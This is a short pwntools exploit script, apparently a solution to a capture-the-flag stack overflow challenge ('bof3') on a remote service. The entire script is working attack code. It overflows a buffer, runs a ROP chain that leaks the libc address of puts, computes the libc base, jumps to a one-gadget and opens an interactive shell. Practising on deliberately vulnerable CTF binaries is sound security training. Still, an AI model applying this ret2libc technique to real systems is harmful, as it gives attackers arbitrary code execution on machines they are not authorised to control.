from pwn import *

context.arch = "amd64"

r = remote("csie.ctf.tw", 10127)
#r = process("./bof3-2c63f903b5d7d8586ec95e160c6cbd7a")

payload = 16*'a'

puts_got = 0x601018
pop_rdi = 0x400673
puts_plt = 0x004004a0
main = 0x004005b7
puts_libc = 0x809c0

#raw_input()

r.sendline(payload + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))
r.recvuntil('\n')

leak_puts = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))

base = leak_puts - puts_libc

onegadget = base + 0x4f2c5

r.sendline(payload + p64(onegadget))

r.interactive()
